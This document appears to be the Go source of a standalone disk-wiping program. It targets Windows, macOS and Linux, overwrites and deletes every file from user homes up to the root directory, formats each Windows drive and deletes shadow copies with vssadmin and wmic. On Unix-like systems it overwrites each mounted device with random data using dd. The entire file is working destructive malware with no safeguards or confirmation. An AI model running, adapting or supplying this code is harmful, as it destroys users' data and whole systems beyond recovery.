package main

import (
	"crypto/rand"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

// Make WaitLock
var wg sync.WaitGroup

func main() {
	// Remove Current User Files //
	usr, err := user.Current()
	if err != nil {
		fmt.Println(err.Error())
	}
	openAndRecurse(usr.HomeDir + string(filepath.Separator))
	// Remove OS Specific files //
	// Windows Specific //
	if runtime.GOOS == "windows" {
		// Removing Users Files //
		openAndRecurse("C:\\Users\\")
		// Start Formating Disk //
		for _, drive := range getdrives() {
			d2 := drive + ":"
			//fmt.Println(d2)
			//wg.Add(1)
			go runCommand("Format", []string{d2, "/P:1"})
			// Delete Volume Shadow Copy //
			go runCommand("vssadmin.exe", []string{"delete", "shadows", "/for=" + d2, "/oldest", "/quiet"})
		}
		// Delete Volume Shadow Copy //
		runCommand("wmic.exe", []string{"shadowcopy", "delete", "/nointeractive"})
		// Remove Program Files //
		openAndRecurse("C:\\Program Files\\")
		if runtime.GOARCH == "x64" {
			openAndRecurse("C:\\Program Files (x86)\\")
		}
		// Remove Root Files (This should be done as last as possible, target files first) //
		openAndRecurse("C:\\")
	}
	// MacOS Specific //
	if runtime.GOOS == "darwin" {
		// Up the ulimit for open files //
		runCommand("ulimit", []string{"-n", "12288"})
		// Removing Users Homes //
		openAndRecurse("/Users/")
		// Removing var //
		openAndRecurse("/private/var/")
		// Removing etc //
		openAndRecurse("/private/etc/")
		// Remove Data //
		openAndRecurse("/Library/")
		// Remove Program Files //
		openAndRecurse("/Applications/")
		// Start Zero Disks //
		res, err := runCommand("mount", []string{})
		fmt.Println(res)
		if err != nil {
			fmt.Println(err.Error())
		}
		wordz := strings.Split(res, " ")
		for _, wordo := range wordz {
			if strings.Contains(wordo, "/dev/") {
				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo})
			}
		}
		// Remove Root Files (This should be done as last as possible, target files first) //
		openAndRecurse("/")
	}
	// Linux Specific //
	if runtime.GOOS == "linux" {
		// Up the ulimit for open files //
		runCommand("ulimit", []string{"-n", "12288"})
		// Removing Users Homes //
		openAndRecurse("/home/")
		// Removing opt //
		openAndRecurse("/opt/")
		// Removing var //
		openAndRecurse("/var/")
		// Removing etc //
		openAndRecurse("/etc/")
		// Start Zero Disks //
		res, err := runCommand("mount", []string{})
		fmt.Println(res)
		if err != nil {
			fmt.Println(err.Error())
		}
		wordz := strings.Split(res, " ")
		for _, wordo := range wordz {
			if strings.Contains(wordo, "/dev/") {
				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo})
			}
		}
		openAndRecurse("/")
	}
	wg.Wait()

}

func openAndRecurse(pathToDir string) {
	files, err := ioutil.ReadDir(pathToDir)
	if err != nil {
		fmt.Println(err)
		//return
	}
	for _, file := range files {
		//fmt.Println(file.Name())
		if file.IsDir() {
			//fmt.Println("--DEBUG-- File is a dir, recurse time!")
			dirName := file.Name() + string(filepath.Separator)
			fullPath := strings.Join([]string{pathToDir, dirName}, "")
			openAndRecurse(fullPath)
		} else {
			fullPath := strings.Join([]string{pathToDir, file.Name()}, "")
			wg.Add(1)
			go srmFile(fullPath, &wg)
		}
	}
}

func srmFile(fName string, wg *sync.WaitGroup) error {
	defer wg.Done()
	f, err := os.OpenFile(fName, os.O_WRONLY, 0000)
	if err != nil {
		return err
	}
	fileInfo, err := f.Stat()
	if err != nil {
		return errors.New("Failed to retrieve file info")
	}
	if fileInfo.IsDir() {
		return errors.New("Trying to remove directory ")
	}
	s := fileInfo.Size()
	if _, err := io.CopyN(f, rand.Reader, s); err != nil {
		return errors.New("Could not write to file")
	}
	if err != nil {
		return err
	}
	f.Close()
	return os.Remove(f.Name())
}

// Windows helper function for listing all drives
func getdrives() (r []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		_, err := os.Open(string(drive) + ":\\")
		if err == nil {
			r = append(r, string(drive))
		}
	}
	return
}

func runCommand(cmd string, args []string) (string, error) {
	out, err := exec.Command(cmd, args...).CombinedOutput()
	if err != nil {
		return string(out), err
	}
	return string(out), nil
}
